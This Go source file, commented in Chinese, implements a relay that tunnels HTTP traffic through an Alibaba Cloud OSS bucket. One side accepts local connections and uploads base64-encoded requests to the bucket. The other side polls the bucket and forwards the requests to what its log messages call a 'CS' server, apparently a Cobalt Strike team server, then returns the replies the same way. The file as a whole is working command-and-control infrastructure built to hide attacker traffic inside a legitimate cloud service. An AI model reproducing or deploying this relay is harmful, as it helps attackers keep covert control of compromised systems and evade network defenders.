package main

import (
	"bufio"
	"bytes"
	"encoding/base64"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/aliyun/aliyun-oss-go-sdk/oss"
	"github.com/google/uuid"
)

type Client struct {
	Cli             *oss.Client
	Bucket          *oss.Bucket
	Endpoint        string
	AccessKeyId     string
	AccessKeySecret string
	BucketName      string
}

var Service *Client

func InitClient(endPoint, accessKeyId, accessKeySecret, bucketName string) error {
	ossClient, err := oss.New(endPoint, accessKeyId, accessKeySecret)
	if err != nil {
		return err
	}
	ossBucket, err := ossClient.Bucket(bucketName)
	if err != nil {
		return err
	}
	Service = &Client{
		Cli:             ossClient,
		Bucket:          ossBucket,
		Endpoint:        endPoint,
		AccessKeyId:     accessKeyId,
		AccessKeySecret: accessKeySecret,
		BucketName:      bucketName,
	}
	return nil
}

var (
	server_address string
	bind_address   string
	timeout        = 30
)

func main() {
	osskey := flag.String("osskey", "", "format: endpoint:accessKeyId:accessKeySecret:bucketName")
	mode := flag.String("mode", "", "client/server 二选一")
	address := flag.String("address", "", "监听地址或者目标地址，格式：127.0.0.1:8080")
	flag.Parse()

	if *mode == "" || *osskey == "" || *address == "" {
		flag.PrintDefaults()
		os.Exit(0)
	}

	parts := strings.SplitN(*osskey, ":", 4)
	if len(parts) != 4 {
		log.Fatalln("[x]", "osskey 格式错误，需要: endpoint:accessKeyId:accessKeySecret:bucketName")
	}

	server_address = *address
	bind_address = *address

	if err := InitClient(parts[0], parts[1], parts[2], parts[3]); err != nil {
		log.Fatalln("[x]", "初始化 OSS 客户端失败:", err)
	}

	switch *mode {
	case "client":
		startClient()
	case "server":
		startServer()
	default:
		flag.PrintDefaults()
		os.Exit(0)
	}
}

func startServer() {
	log.Println("[+]", "服务端启动成功")
	var inflight sync.Map
	for {
		time.Sleep(1 * time.Second)
		for _, c2 := range List(Service) {
			if !strings.Contains(c2.Key, "client.txt") {
				continue
			}
			if _, loaded := inflight.LoadOrStore(c2.Key, struct{}{}); loaded {
				continue
			}
			go func(key string) {
				defer inflight.Delete(key)
				process_server(key)
			}(c2.Key)
		}
	}
}

func List(c *Client) []oss.ObjectProperties {
	lsRes, err := c.Bucket.ListObjects(oss.MaxKeys(100), oss.Prefix(""))
	if err != nil {
		log.Println("[-]", "ListObjects 失败:", err)
		return nil
	}
	return lsRes.Objects
}

func startClient() {
	log.Println("[+]", "客户端启动成功")
	server, err := net.Listen("tcp", bind_address)
	if err != nil {
		log.Fatalln("[x]", "listen address ["+bind_address+"] faild.")
	}
	for {
		conn, err := server.Accept()
		if err != nil {
			log.Println("Accept() failed, err: ", err)
			continue
		}
		log.Println("[+]", "有客户进入：", conn.RemoteAddr())
		go process(conn)
	}
}

// readHTTPMessage 读取一个完整的 HTTP 请求或响应的原始字节。
// 使用 bufio.Reader 以避免逐字节 syscall，并通过 Content-Length / Transfer-Encoding 决定 body 长度。
func readHTTPMessage(br *bufio.Reader) ([]byte, error) {
	var buf bytes.Buffer
	for {
		line, err := br.ReadBytes('\n')
		if err != nil {
			return nil, err
		}
		buf.Write(line)
		if bytes.Equal(line, []byte("\r\n")) || bytes.Equal(line, []byte("\n")) {
			break
		}
	}
	header := buf.Bytes()
	if cl := findHeader(header, "Content-Length"); cl != "" {
		n, err := strconv.Atoi(strings.TrimSpace(cl))
		if err != nil {
			return nil, fmt.Errorf("invalid Content-Length: %q", cl)
		}
		if n > 0 {
			body := make([]byte, n)
			if _, err := io.ReadFull(br, body); err != nil {
				return nil, err
			}
			buf.Write(body)
		}
		return buf.Bytes(), nil
	}
	if te := findHeader(header, "Transfer-Encoding"); strings.Contains(strings.ToLower(te), "chunked") {
		for {
			line, err := br.ReadBytes('\n')
			if err != nil {
				return nil, err
			}
			buf.Write(line)
			sizeStr := strings.TrimRight(strings.TrimRight(string(line), "\n"), "\r")
			if semi := strings.Index(sizeStr, ";"); semi >= 0 {
				sizeStr = sizeStr[:semi]
			}
			size, err := strconv.ParseInt(strings.TrimSpace(sizeStr), 16, 64)
			if err != nil {
				return nil, fmt.Errorf("bad chunk size: %q", sizeStr)
			}
			if size == 0 {
				trailer, err := br.ReadBytes('\n')
				if err != nil {
					return nil, err
				}
				buf.Write(trailer)
				return buf.Bytes(), nil
			}
			chunk := make([]byte, size+2)
			if _, err := io.ReadFull(br, chunk); err != nil {
				return nil, err
			}
			buf.Write(chunk)
		}
	}
	return buf.Bytes(), nil
}

func findHeader(header []byte, name string) string {
	lowerName := strings.ToLower(name)
	for _, raw := range bytes.Split(header, []byte("\n")) {
		line := string(bytes.TrimRight(raw, "\r"))
		colon := strings.Index(line, ":")
		if colon < 0 {
			continue
		}
		if strings.ToLower(line[:colon]) == lowerName {
			return line[colon+1:]
		}
	}
	return ""
}

func process(conn net.Conn) {
	id := uuid.New().String()
	defer conn.Close()

	_ = conn.SetReadDeadline(time.Now().Add(10 * time.Second))
	br := bufio.NewReader(conn)
	raw, err := readHTTPMessage(br)
	if err != nil {
		log.Println("[-]", id, "读取 HTTP 请求失败:", err)
		return
	}
	log.Println("[+]", id, "从客户端接受 HTTP 请求完毕，长度:", len(raw))

	key := id
	Send(Service, key+"/client.txt", base64.StdEncoding.EncodeToString(raw))

	for i := 1; ; i++ {
		time.Sleep(1 * time.Second)
		if i >= timeout {
			log.Println("[x]", id, "超时，断开")
			Del(Service, key+"/client.txt")
			return
		}
		buff := Get(Service, key+"/server.txt")
		if buff == nil {
			continue
		}
		log.Println("[+]", id, "收到服务器消息")
		Del(Service, key+"/server.txt")
		sDec, err := base64.StdEncoding.DecodeString(string(buff))
		if err != nil {
			log.Println("[x]", id, "Base64 解码错误:", err)
			return
		}
		if _, err := conn.Write(sDec); err != nil {
			log.Println("[-]", id, "写回客户端失败:", err)
			return
		}
		log.Println("[+]", id, "发送完成")
		return
	}
}

func Send(c *Client, name string, content string) {
	if err := c.Bucket.PutObject(name, strings.NewReader(content)); err != nil {
		log.Println("[-]", "上传失败:", err)
	}
}

func Get(c *Client, name string) []byte {
	body, err := c.Bucket.GetObject(name)
	if err != nil {
		return nil
	}
	defer body.Close()
	data, err := io.ReadAll(body)
	if err != nil {
		log.Println("[-]", "读取对象失败:", err)
		return nil
	}
	return data
}

func Del(c *Client, name string) {
	if err := c.Bucket.DeleteObject(name); err != nil {
		log.Println("[-]", "删除对象失败:", name, err)
	}
}

func process_server(name string) {
	id := name[:strings.Index(name, "/")]
	log.Println("[+]", "发现客户端："+id)

	buff := Get(Service, name)
	if buff == nil {
		Del(Service, name)
		return
	}
	Del(Service, name)

	sDec, err := base64.StdEncoding.DecodeString(string(buff))
	if err != nil {
		log.Println("[-]", id, "Base64 解码错误:", err)
		return
	}

	conn, err := net.Dial("tcp", server_address)
	if err != nil {
		log.Println("[-]", id, "连接 CS 服务器失败:", err)
		return
	}
	defer conn.Close()

	if _, err := conn.Write(sDec); err != nil {
		log.Println("[-]", id, "无法向 CS 服务器发送数据包:", err)
		return
	}

	_ = conn.SetReadDeadline(time.Now().Add(10 * time.Second))
	br := bufio.NewReader(conn)
	raw, err := readHTTPMessage(br)
	if err != nil {
		log.Println("[-]", id, "读取 CS 响应失败:", err)
		return
	}
	log.Println("[+]", id, "从 CS 服务器接收完毕，长度:", len(raw))

	Send(Service, id+"/server.txt", base64.StdEncoding.EncodeToString(raw))
	log.Println("[+]", id, "服务器数据发送完毕")
}
